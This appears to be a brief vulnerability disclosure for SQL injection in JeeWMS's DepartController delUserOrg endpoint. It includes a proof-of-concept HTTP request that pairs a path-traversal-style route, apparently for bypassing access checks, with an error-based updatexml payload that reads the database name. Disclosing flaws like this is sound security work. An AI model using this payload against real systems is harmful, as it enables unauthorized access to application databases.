The `userid` and `departid` are user-controllable and of type `string`, which can be directly concatenated into the `sql` statement, resulting in `SQL` injection.

`org.jeecgframework.web.system.controller.core.DepartController#delUserOrg`

![image-20250724172245956](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250724172245956.png?imageSlim)

vulnerabilitiy`POC`

```http
GET /jeewms/wmsApiController.do/../departController.do?delUserOrg&userid=10'/**/and/**/updatexml(1,concat(0x7e,database(),0x7e),1)/**/and/**/'&departid=10 HTTP/1.1
Host: 192.168.21.128:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![image-20250724172404583](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250724172404583.png?imageSlim)

